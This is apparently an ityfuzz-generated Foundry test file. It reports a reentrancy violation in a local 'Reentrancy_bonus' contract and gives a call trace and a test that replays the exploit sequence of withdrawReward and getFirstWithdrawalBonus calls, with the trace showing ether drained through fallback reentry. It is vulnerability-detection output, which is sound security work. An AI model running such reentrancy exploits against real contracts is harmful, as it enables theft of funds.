// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

// ityfuzz evm -t './build/*' -f
/*

😊😊 Found violations!


================ Description ================
[Reentrancy]: Reentrancy on "build/Reentrancy_bonus(0x887db5715868498cff494b5dcc8eda6ce5b7652a)" at slot 85735271367771915716675224232821039653113287889578451888604367278834276145116
================ Trace ================
   │  │  │  [Sender] 0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb
   │  │  │  │  ├─[5] 0x887dB5715868498Cff494b5Dcc8eDA6CE5B7652a.withdrawReward(0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb)
   │  │  │  │  │  ├─[6] [Sender] 0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb.fallback()
   │  │  │  │  │  │  └─[7] 0x887dB5715868498Cff494b5Dcc8eDA6CE5B7652a.call{value: 127.6966 ether}(0x00000000)
   │  [Sender] 0xe1A425f1AC34A8a441566f93c82dD730639c8510
   │  │  ├─[3] 0x887dB5715868498Cff494b5Dcc8eDA6CE5B7652a.getFirstWithdrawalBonus(0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024)
   │  │  │  ├─[4] [Sender] 0xe1A425f1AC34A8a441566f93c82dD730639c8510.fallback()
   │  │  │  │  ├─[5] 0x887dB5715868498Cff494b5Dcc8eDA6CE5B7652a.getFirstWithdrawalBonus(0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024)
   │  │  │  │  │  ├─[6] [Sender] 0xe1A425f1AC34A8a441566f93c82dD730639c8510.fallback()
   │  │  │  │  └─[5] 0x887dB5715868498Cff494b5Dcc8eDA6CE5B7652a.call(0x00000000)
   │  │  └─[3] 0x887dB5715868498Cff494b5Dcc8eDA6CE5B7652a.call(0x00000000)


 */

contract Build is Test {
    function setUp() public {
    }

    function test() public {
        vm.prank(0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb);
        I(0x887dB5715868498Cff494b5Dcc8eDA6CE5B7652a).withdrawReward(0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb);
        vm.prank(0xe1A425f1AC34A8a441566f93c82dD730639c8510);
        I(0x887dB5715868498Cff494b5Dcc8eDA6CE5B7652a).getFirstWithdrawalBonus(0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024);
        vm.prank(0xe1A425f1AC34A8a441566f93c82dD730639c8510);
        I(0x887dB5715868498Cff494b5Dcc8eDA6CE5B7652a).getFirstWithdrawalBonus(0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024);
    }

    // Stepping with return
    receive() external payable {}
}

interface I {
    function getFirstWithdrawalBonus(address) external payable;
    function withdrawReward(address) external payable;
}
